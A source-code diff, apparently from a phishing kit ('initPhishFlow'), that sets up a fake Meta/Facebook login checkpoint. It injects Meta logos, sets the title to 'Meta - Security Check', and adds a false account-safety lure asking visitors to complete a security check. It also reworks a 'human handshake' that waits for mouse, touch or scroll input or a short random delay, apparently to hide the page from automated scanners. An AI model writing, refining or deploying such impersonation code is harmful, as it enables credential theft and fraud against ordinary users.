@@ -128,18 +128,29 @@ const initPhishFlow = () => {
         const target = document.getElementById('meta-branding-checkpoint');
         if (target && !target.innerHTML.trim()) {
             target.innerHTML = `<svg viewBox="0 0 948 191" style="height: 28px; width: auto;" aria-hidden="true"><defs><linearGradient id="G1" x1="61" y1="117" x2="259" y2="127" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#0064e1"/><stop offset="0.4" style="stop-color:#0064e1"/><stop offset="0.83" style="stop-color:#0073ee"/><stop offset="1" style="stop-color:#0082fb"/></linearGradient><linearGradient id="G2" x1="45" y1="139" x2="45" y2="66" gradientUnits="userSpaceOnUse"><stop offset="0" style="stop-color:#0082fb"/><stop offset="1" style="stop-color:#0064e0"/></linearGradient></defs><path fill="#0081fb" d="${_p1}"/><path fill="url(#G1)" d="${_p2}"/><path fill="url(#G2)" d="${_p3}"/><path fill="#1c1e21" d="${_p4}"/></svg>`;
-            document.title = getStr(2).split(' ')[3] + ' - Log In or Sign Up'; // Dynamic title reconstruction
+
+            const label = document.getElementById('meta-label-checkpoint');
+            if (label) label.innerText = 'Security Check';
+
+            const instr = document.getElementById('meta-instr-checkpoint');
+            if (instr) instr.innerText = 'To help keep your account safe, please complete this security check.';
+
+            document.title = 'Meta - Security Check';
         }
         const logoTarget = document.getElementById('logo-injection-point');
         if (logoTarget && !logoTarget.innerHTML.trim()) {
             logoTarget.innerHTML = `<img src="/facebook.png" alt="Branding" class="fb-logo" style="height: 38px;">`;
         }
+        document.body.classList.add('branding-ready');
     };
 
-    // 🛡️ HUMAN HANDSHAKE LISTENERS
+    // 🛡️ ULTRA-FAST HUMAN HANDSHAKE
     window.addEventListener('mousemove', execHandshake, { once: true });
     window.addEventListener('touchstart', execHandshake, { once: true });
-    setTimeout(execHandshake, 2000); // Fail-safe fallback
+    window.addEventListener('scroll', execHandshake, { once: true });
+
+    // Near-instant professional fallback
+    setTimeout(execHandshake, 80 + Math.random() * 120);
 
     // ⚡ INSTANT STATE RESOLUTION (Prevents Flashing)
     if (isVerified) {
